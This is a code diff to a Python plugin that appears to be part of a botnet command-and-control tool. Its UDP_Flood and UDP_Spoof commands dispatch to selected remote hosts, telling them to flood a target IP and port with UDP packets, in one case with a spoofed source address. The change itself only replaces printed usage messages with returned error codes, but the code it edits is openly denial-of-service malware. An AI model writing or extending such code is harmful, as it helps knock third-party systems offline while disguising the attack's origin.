@@ -26,11 +26,12 @@ class Files(Plugin):
         "UDP_Spoof <target_ip> <target_port> <spoofed_ip> <spoofed_port> [payload]"
 
     def udp_flood(self, server, args):
-        """Flood target machine with UDP packets"""
+        """Flood target machine with UDP packets."""
+        ret = [None,0,""]
         hosts = server.get_selected()
-        state = None
         if len(args) < 2:
-            print("Usage: UDP_Flood <target_ip> <target_port> [payload]")
+            ret[2] = ("Syntax : %s" % self.__cmd_help__["UDP_Flood"])
+            ret[1] = 1 # Invalid Syntax Error Code
         else:
             try:
                 # IP:port:payload
@@ -43,16 +44,17 @@ class Files(Plugin):
                     host.send("%03d" % len(cmd))
                     host.send(cmd)
                 except sock_error:
-                    state = "basic"
-        return state
+                    ret[0] = "basic"
+                    ret[1] = 2 # Socket Error Code
+        return ret
 
     def udp_spoof(self, server, args):
-        """Flood target machine with UDP packets via spoofed ip & port"""
+        """Flood target machine with UDP packets via spoofed ip & port."""
+        ret = [None,0,""]
         hosts = server.get_selected()
-        state = None
         if len(args) < 4:
-            print("Usage: UDP_Spoof <target_ip> <target_port> <spoofed_ip>\
-                  <spoofed_port> [payload]")
+            ret[2] = ("Syntax : %s" % self.__cmd_help__["UDP_Spoof"])
+            ret[1] = 1 # Invalid Syntax Error Code
         else:
             try:
                 # IP:port:new_ip:new_port:payload
@@ -65,5 +67,6 @@ class Files(Plugin):
                     host.send("%03d" % len(cmd))
                     host.send(cmd)
                 except sock_error:
-                    state = "basic"
-        return state
+                    ret[0] = "basic"
+                    ret[1] = 2 # Socket Error Code
+        return ret
